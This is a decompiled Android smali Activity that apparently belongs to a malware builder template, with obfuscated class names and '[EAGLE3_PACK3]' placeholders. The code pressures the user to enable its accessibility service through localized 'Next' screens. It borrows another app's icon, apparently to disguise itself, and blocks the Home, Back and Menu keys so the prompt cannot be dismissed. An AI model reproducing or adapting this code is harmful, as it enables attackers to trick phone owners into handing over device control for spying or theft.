.class public L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;
.super Landroid/app/Activity;
.source "isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20.java"


# static fields
.field private static instance:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

.field static myctx:Landroid/content/Context;


# instance fields
.field private MyBaseview:Landroid/widget/RelativeLayout;

.field private Oklistner:Landroid/view/View$OnClickListener;

.field private nextButton:Landroid/widget/Button;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 33
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 177
    new-instance v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;

    invoke-direct {v0, p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;)V

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    return-void
.end method

.method static synthetic access$000(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;)Landroid/view/View$OnClickListener;
    .locals 0

    .line 33
    iget-object p0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    return-object p0
.end method

.method public static isActivityOpen()Z
    .locals 1

    .line 36
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->instance:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method


# virtual methods
.method public finish()V
    .locals 1

    const/4 v0, 0x0

    .line 172
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->instance:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    .line 173
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public onBackPressed()V
    .locals 0

    .line 167
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    .line 46
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 47
    sget-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->myctx:Landroid/content/Context;

    if-nez p1, :cond_0

    .line 49
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->myctx:Landroid/content/Context;

    .line 51
    :cond_0
    sput-object p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->instance:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    .line 56
    :try_start_0
    const-class p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    if-nez p1, :cond_9

    .line 57
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object p1

    .line 60
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/Tools;->isMIUI(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_8

    const v0, 0x7f0a001f

    .line 61
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->setContentView(I)V

    const v0, 0x7f08005d

    .line 64
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/RelativeLayout;

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->MyBaseview:Landroid/widget/RelativeLayout;

    const v0, 0x7f080061

    .line 66
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    .line 69
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/16 v1, 0xc31

    const/4 v2, 0x2

    const/4 v3, 0x1

    if-eq v0, v1, :cond_3

    const/16 v1, 0xca9

    if-eq v0, v1, :cond_2

    const/16 v1, 0xf2e

    if-eq v0, v1, :cond_1

    goto :goto_0

    :cond_1
    const-string v0, "zh"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    const/4 p1, 0x2

    goto :goto_1

    :cond_2
    const-string v0, "en"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    const/4 p1, 0x0

    goto :goto_1

    :cond_3
    const-string v0, "ar"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz p1, :cond_4

    const/4 p1, 0x1

    goto :goto_1

    :cond_4
    :goto_0
    const/4 p1, -0x1

    :goto_1
    const-string v0, "Next"

    const v1, 0x7f07005c

    if-eqz p1, :cond_7

    if-eq p1, v3, :cond_6

    if-eq p1, v2, :cond_5

    .line 83
    :try_start_1
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->MyBaseview:Landroid/widget/RelativeLayout;

    invoke-virtual {p1, v1}, Landroid/widget/RelativeLayout;->setBackgroundResource(I)V

    .line 84
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_2

    .line 79
    :cond_5
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->MyBaseview:Landroid/widget/RelativeLayout;

    const v0, 0x7f070058

    invoke-virtual {p1, v0}, Landroid/widget/RelativeLayout;->setBackgroundResource(I)V

    .line 80
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    const-string v0, "\u4e0b\u4e00\u4e2a"

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    goto :goto_2

    .line 75
    :cond_6
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->MyBaseview:Landroid/widget/RelativeLayout;

    const v0, 0x7f070054

    invoke-virtual {p1, v0}, Landroid/widget/RelativeLayout;->setBackgroundResource(I)V

    .line 76
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    const-string v0, "\u0627\u0644\u062a\u0627\u0644\u064a"

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    goto :goto_2

    .line 71
    :cond_7
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->MyBaseview:Landroid/widget/RelativeLayout;

    invoke-virtual {p1, v1}, Landroid/widget/RelativeLayout;->setBackgroundResource(I)V

    .line 72
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    goto :goto_2

    :cond_8
    const p1, 0x7f0a001c

    .line 89
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->setContentView(I)V

    .line 91
    sget-object p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->appContext:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    const-string v0, "[EAGLE_PACKAGE_NAME]"

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object p1

    const v0, 0x7f08005e

    .line 92
    invoke-virtual {p0, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ImageView;

    .line 93
    invoke-virtual {v0, p1}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 94
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {v0, p1}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f080022

    .line 96
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    .line 97
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f080092

    .line 99
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    .line 100
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const p1, 0x7f080069

    .line 102
    invoke-virtual {p0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    .line 103
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 107
    :goto_2
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->nextButton:Landroid/widget/Button;

    new-instance v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$1;

    invoke-direct {v0, p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$1;-><init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto :goto_3

    .line 137
    :cond_9
    invoke-virtual {p0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->finish()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :goto_3
    return-void
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    .line 149
    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->instance:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    .line 150
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x3

    const/4 v0, 0x1

    if-ne p1, p2, :cond_0

    return v0

    :cond_0
    const/4 p2, 0x4

    if-ne p1, p2, :cond_1

    return v0

    :cond_1
    const/16 p2, 0x52

    if-ne p1, p2, :cond_2

    return v0

    :cond_2
    const/4 p1, 0x0

    return p1
.end method
